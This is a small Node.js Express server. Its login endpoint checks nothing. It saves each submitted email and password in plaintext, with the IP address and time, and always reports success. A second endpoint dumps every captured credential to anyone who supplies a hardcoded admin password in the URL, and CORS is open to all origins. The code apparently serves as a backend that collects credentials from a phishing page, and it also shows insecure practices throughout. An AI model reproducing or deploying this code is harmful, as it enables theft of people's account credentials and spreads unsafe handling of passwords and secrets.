const express = require('express');
const bodyParser = require('body-parser');
const app = express();
const PORT = process.env.PORT || 3000;

// Temporary database (replace with MongoDB/Postgres later)
let userLogins = [];

app.use(bodyParser.json());

// Allow frontend to access this API (CORS)
app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});

// Save user login
app.post('/api/login', (req, res) => {
  const { email, password } = req.body;
  userLogins.push({
    id: Date.now(),
    email,
    password, // ⚠️ In production, hash this with bcrypt!
    loginTime: new Date().toLocaleString(),
    ip: req.ip || "127.0.0.1"
  });
  res.json({ success: true });
});

// Get all logins (admin only)
app.get('/api/logins', (req, res) => {
  const { adminPassword } = req.query;
  if (adminPassword !== "kolawole") {
    return res.status(401).json({ error: "Unauthorized!" });
  }
  res.json(userLogins);
});

// Start server
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
